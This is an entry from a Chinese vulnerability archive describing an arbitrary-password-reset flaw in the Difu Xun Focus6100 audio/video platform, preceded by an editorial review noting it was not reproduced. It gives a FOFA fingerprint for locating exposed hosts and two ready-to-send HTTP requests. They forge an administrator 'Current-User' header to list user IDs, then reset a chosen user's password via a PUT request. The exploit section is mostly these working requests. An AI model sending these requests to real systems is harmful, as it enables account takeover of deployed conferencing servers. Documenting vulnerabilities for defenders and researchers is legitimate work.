---
source: "wy876 漏洞文库"
id: "vw-c91c7909903f9c87fdcf8eff"
entity_id: "ve-c91c7909903f9c87fdcf8eff"
schema_version: "1"
fofa_unverified: "web.icon=="
title: "迪威讯Focus6100音视频通讯平台存在任意用户密码修改漏洞"
product: "迪威讯Focus6100"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "伪造Current-User，已知/查询用户ID"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E6%99%BA%E8%83%BD%E8%AE%BE%E5%A4%87/%E8%BF%AA%E5%A8%81%E8%AE%AF/%E8%BF%AA%E5%A8%81%E8%AE%AFFocus6100%E9%9F%B3%E8%A7%86%E9%A2%91%E9%80%9A%E8%AE%AF%E5%B9%B3%E5%8F%B0%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E6%BC%8F%E6%B4%9E.md"
review_date: "2026-10-02"
side_effects: "本篇未提供足以确认无副作用的完整验证流程；应依正文所述配置、权限与交互前提评估，不能把通告或截图当成可直接运行的检测脚本"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/iucuo1rzm9ml0ugx"
source_status: "recorded"
---

# 迪威讯Focus6100音视频通讯平台存在任意用户密码修改漏洞

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：迪威讯Focus6100
- 本文讨论：users/id/changepassword PUT
- 版本、权限与配置前提：伪造Current-User，已知/查询用户ID
- 资料类型：用户查询及重置请求；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- 重置后登录段空缺，无结果证据；JSON Content-Type正文为未加引号摘要，实际解析格式待说明
- 资产引擎标签/残缺元数据问题
- 已落实的文本修订：HTTP 报文围栏改为 http；残缺指纹退出可执行索引并保留原值。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证

### 操作风险与恢复

- 本篇未提供足以确认无副作用的完整验证流程；应依正文所述配置、权限与交互前提评估，不能把通告或截图当成可直接运行的检测脚本

### 待核与来源

- 摘要处理、头部身份及后置登录待核
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


# 一、漏洞简介
迪威讯Focus6100音视频通讯平台存在任意用户密码修改漏洞

# 二、影响版本
+ 迪威讯Focus6100音视频通讯平台

# 三、资产测绘
+ fofa`web.icon=="bbc933535a6bfe478afb1fd0b3c470bf"`
+ 特征


# 四 、漏洞复现
先获取ID

```http
GET /portal/rest/users HTTP/1.1
Host: 
Accept: application/json, text/plain, */*
Current-User: admin|Administrator
Accept-Language: zh-CN
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
Connection: close
```


利用获取ID重置密码

```http
PUT /portal/rest/users/ff8080819200f6750192272f08bb0000/changepassword HTTP/1.1
Host: 
Content-Length: 32
Accept: application/json, text/plain, */*
Current-User: admin|Administrator
Accept-Language: zh-CN
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
Content-Type: application/json;charset=UTF-8
Accept-Encoding: gzip, deflate
Connection: close

e10adc3949ba59abbe56e057f20f883e
```


重置后登录：


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/iucuo1rzm9ml0ugx>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
